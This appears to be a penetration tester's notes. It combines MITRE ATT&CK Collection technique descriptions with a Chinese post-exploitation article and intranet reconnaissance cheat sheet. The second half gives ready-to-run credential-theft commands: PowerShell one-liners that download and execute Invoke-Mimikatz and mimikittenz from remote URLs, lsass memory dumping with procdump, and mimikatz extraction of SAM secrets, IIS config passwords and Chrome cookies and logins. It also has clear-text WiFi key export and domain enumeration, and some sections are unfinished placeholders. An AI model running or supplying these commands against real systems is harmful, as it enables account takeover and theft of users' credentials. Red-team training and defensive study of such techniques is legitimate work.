# TA0009 Collection
The adversary is trying to gather data of interest to their goal.

Collection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.


## T1560	Archive Collected Data	
An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.
.001	Archive via Utility	An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip, WinRAR, and WinZip. Most utilities include functionality to encrypt and/or compress data.
.002	Archive via Library	An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.
.003	Archive via Custom Method	An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.
T1123	Audio Capture	An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.
T1119	Automated Collection	Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools.
T1115	Clipboard Data	Adversaries may collect data stored in the clipboard from users copying information within or between applications.
T1530	Data from Cloud Storage Object	Adversaries may access data objects from improperly secured cloud storage.
T1602	Data from Configuration Repository	Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.
.001	SNMP (MIB Dump)	Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).
.002	Network Device Configuration Dump	Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.
T1213	Data from Information Repositories	Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.
.001	Confluence	Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:
.002	Sharepoint	Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:
T1005	Data from Local System	Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.
T1039	Data from Network Shared Drive	Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.
T1025	Data from Removable Media	Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.
T1074	Data Staged	Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.
.001	Local Data Staging	Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.
.002	Remote Data Staging	Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.
## T1114	Email Collection

Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients.
### .001	Local Email Collection	
Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.

windows下可用mailsniper.ps1工具。过程：
- 掌握某一合法用户的账号密码，登录outlook官方或自己搭的
- 尝试outlook web access(owa) 和 exchange web 服务，`Get-GlobalAddressList -ExchHostname outlook地址 -Username 域名\域用户名 -Password 密码`
- 目标outlook搭建在自己的服务器上时，。。。
- 目标outlook在office365上时。。。

### .002	Remote Email Collection	
Adversaries may target an Exchange server or Office 365 to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.
.003	Email Forwarding Rule	Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations. Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.

## T1056	Input Capture	
Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).
### .001	Keylogging	
Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.
.002	GUI Input Capture	Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).
.003	Web Portal Capture	Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.
.004	Credential API Hooking	Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging, this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:
T1185	Man in the Browser	Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques.
T1557	Man-in-the-Middle	Adversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation. By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.
.001	LLMNR/NBT-NS Poisoning and SMB Relay	By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.
.002	ARP Cache Poisoning	Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.
## T1113	Screen Capture	Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.

## T1125	Video Capture	An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.


后渗透攻防的信息收集之CMD下信息收集

rootsecurity / 2017-12-12 16:39:00 / 浏览数 7980 安全技术 技术讨论顶(0) 踩(0)
Author：小城
后渗透常见的信息收集思路
1.1 系统管理员密码
1.2 其他用户session，3389和ipc连接记录 各用户回收站信息收集
1.3 浏览器密码和浏览器cookies的获取 ie chrome firefox 等
1.4 windows无线密码获取。数据库密码获取
1.5 host文件获取和dns缓存信息收集 等等
1.6 杀软 补丁 进程 网络代理信息wpad信息。软件列表信息
1.7 计划任务 账号密码策略与锁定策略 共享文件夹 web服务器配置文件
1.8 vpn历史密码等 teamview密码等 启动项 iislog 等等
1.9 常用的后渗透信息收集工具。powershell+passrec的使用
1.1 常用来获取windows密码的工具
1.mimikatz
2.wce
3.getpass
4.QuarksPwDump
5.reg-sam
6.pwdump7
7.procdump.exe +mimikatz .......

1.2免杀抓取密码的两种方式
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
tips:powershell 默认windows visa后才有
procdump lsass 进程导出技巧
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bits

C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits
然后本地使用mimikatz 还原密码

1.3 windows本地的信息收集
cmdkey /list

查看3389可信任链接

使用netpass.exe 即可知道密码

net use

查看到已建立连接记录。

也是直接可以 用wmic at sc 等直接执行命令的

1.4 vpn密码获取为例
mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit
其他工具如Dialupass.exe

感兴趣可以看看mimikatz dpapi模块的使用。很强大 sam 密码 ipc连接密码

1.5 windows wifi密码的获取
netsh wlan export profile interface=无线网络连接 key=clear folder=C:\
1.6 ie浏览器的代理信息查看(网络代理信息wpad信息)
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
1.7 windows hosts/iis config
C:\Windows\System32\drivers\etc\hosts windows7 windows2008等
C:\WINDOWS\SYSTEM32\DRIVERS\ETC\HOSTS windows2003位置
提权情况下或者过了uac的情况下直接type一下就行了
iis-web路径
iis6 =========>cscript.exe C:\Inetpub\AdminScripts\adsutil.vbs ENUM W3SVC/1/root
iis7 ,8 =======>appcmd.exe
%systemroot%/system32/inetsrv/appcmd.exe list site ——列出网站列表
%systemroot%\system32\inetsrv\appcmd.exe list vdir ——列出网站物理路径
当然你也可以用mimikatz
mimiktaz 读取iis7配置文件密码

mimikatz.exe privilege::debug log "iis::apphost /in:"%systemroot%\system32\inetsrv\config\applicationHost.config" /live" exit
1.8 windows 回收站的信息获取
其中$I开头的文件保存的是路径信息 $R保存的是文件

FOR /f "skip=1 tokens=1,2 delims= " %c in ('wmic useraccount get name^,sid') do dir /a /b C:$Recycle.Bin%d\ ^>%c.txt
$Recycler = (New-Object -ComObject Shell.Application).NameSpace(0xa);

foreach($file in $Recycler.items()){$file.path;$file.ExtendedProperty("{9B174B33-40FF-11D2-A27E-00C04FC30871} 2")+''+$file.name;$file.Type}
1.9 chrome为例 的密码和cookies获取
%localappdata%\google\chrome\USERDA~1\default\LOGIND~1

%localappdata%\google\chrome\USERDA~1\default\USERDA~1

%localappdata%\google\chrome\USERDA~1\default\cookies

chrome的用户信息保存在本地文件为sqlite 数据库格式
2.0 mimikatz+WebBrowserPassView.exe获取浏览器的密码和cookie信息
mimikatz 读取chrome cookies

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exit

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1" exit

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1" exit //读chrome密码
2.1 常用的信息收集工具介绍
passrec 工具包里面包含常用的密码恢复工具；

是内网渗透的好帮手
vnc
mail
vpn
router
ie
firefox
chrome 等等，有兴趣可以自己测试

2.2 powershell 常用工具的信息收集工具
FTP访问、共享连接、putty连接 驱动、应用程序、hosts 文件、进程、无线网络记录

powershell "IEX (New-Object Net.WebClient).DownloadString(' https://github.com/samratashok/nishang/tree/master/Gather/Gather/Get-Information.ps1'); Get-Information"
正则过滤进程密码，已测windows7

powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz

sqlserver密码获取工具Get-MSSQLCredentialPasswords.psm1 //未测
2.3 windows log的信息查看
windows自带的命令就可以

日志查看收集

1、Windows2003下默认存在eventquery.vbs
cscript c:\WINDOWS\system32\eventquery.vbs /fi "Datetime eq 06/24/2015,01:00:00AM-06/24/2015,10:00:00AM" /l Security /V #查看SECURITY日志 2015-6.24 上午1点-上午10点日志
2 windows 7以上wevtutil 命令
wevtutil qe security /rd:true /f:text /q:"*[system/eventid=4624 and 4623 and 4627]" #查询所有登录、注销相关的日志语法
3.第三方信息收集工具LogParser.exe psloglist.exe等


## 内网渗透信息收集

### windows 工作组
#### 检查当前shell权限
whoami /user 

whoami /priv
#### 查看系统信息 主机角色

systeminfo

#### 网络连接信息

netstat -ano

#### 主机名

hostname

#### 当前os

wmic OS GET name,caption,csdversion,osarchitecture,version

#### 杀毒软件

WMIC.exe /Node:localhost /Namespace:\\root\SecurityCenter2  Path AntiVirusProduct Get displayName /Format:list

#### 查看当前安装的程序

wmic product get name,version

#### 查看当前在线用户
quser

net user

net user xxx 
net user xxx /domain

net user xxx /domain xxx 123456

wmic useraccount #所有用户，含隐藏

#### 查看网络配置
ipconfig /all

#### 查看进程

tasklist /v

ps：如果某个进程时域用户启动的，那么通过管理员权限进行凭证窃取，然后窃取用户的凭证。

#### 查看当前登录的域
net config workstation

#### 查看远程桌面连接历史记录

#### 查看保存的凭证记录
cmdkey /list

`CMDKEY [{/add | /generic}:targetname {/smartcard | /user:username {/pass{:password}}} | /delete{:targetname | /ras} | /list{:targetname}]`

获取凭证可用：
- mimikatz
- mimikatz powershell
- wce windows credentials editor
- pwddump
- procdump
- lazagne
- cobaltstrike-hashdump，logonpasswords，mimikatz，
破解可用：
- ophcrack+彩虹表

### windows 域
#### 查询工作站与域控间的信任关系

nltest /domain_trusts /all_trusts /v /server:192.168.52.2 返回所有信任192.168.52.2的关联

nltest /dsgetdc:某个域名 /server:某个ip地址 返回域控及相应ip地址

#### 获取域用户列表
net user /do

net group "domain admins" /domain 获取管理员列表

net group "domain controllers" /domain 查看域控制器

net group "domain computers" /domain 查看域机器

net group /domain 查询域里的工作组

net localgroup administrators 

net view #查看同一域内机器列表

#### wmic 使用说明

wmic /?

get-wmic

#### 常见端口
##### 445 smb server messge block 
windows 文件打印共享服务及共享文件夹服务。其命令net use 常用于建立IPC服务

net use 用于将计算机与共享的资源相连接（建立磁盘映射），或者切断计算机与共享资源的连接(删除磁盘映射)，当不带选项使用本命令时，它会列出计算机的连接。


漏洞：ms17-010

##### 137，138，139 NetBios upd端口
137，138 netbios主要用于内网文件传输，

NetBios/SMB 服务获取通过139

##### 135 DCOM和RPC 服务
利用这个端口做WMI工具的远程操作

- 使用时需要开启wmic服务
- 几乎所有命令都是管理员权限
- 如果出现“invalid gloabal switch” 需要使用双引号把该加的地方都加上
- 远程系统的本地安全策略的网络访问，本地账户的共享和安全模式应设为“经典-本地用户以自己的身份验证”
- 防火墙关闭

wmic /node:192.168.1.2 /user:domain\username /password:123456 process call create

该端口可以用来验证是否开启了 Exchange server

##### 53 DNS 服务端口
dns隧道之dns2tcp

dns隧道之dnscat2
##### 389 LADP

LADP端口进行爆破
工具可用hydra等

##### 88 kerberos服务
黄金票据和白银票据伪造，横向扩展某些服务

##### 5985 winRM服务
winrm是windows对ws-management的实现，允许远程用户使用工具和脚本对windows服务器进行管理并获取数据。


### Linux

#### 当前权限
whoami

#### 网络配置

ifconfig

ip

#### 网络端口服务
netstat -anpt

#### 查看进程
ps -aux

ps -ef

#### 查看历史命令
cat /root/.bash_history

#### 查找某个文件

find / -name *.cfg

### ms sqlserver

#### **TODO** impacket-mssqlclient 使用

查看安恒渗透攻击红队百科全书 p84
mssqlclient 

##### 验证以windows认证模式的mssql服务。

`python mssqlclient.py domain/username:password#ip -windows-auth`

##### 验证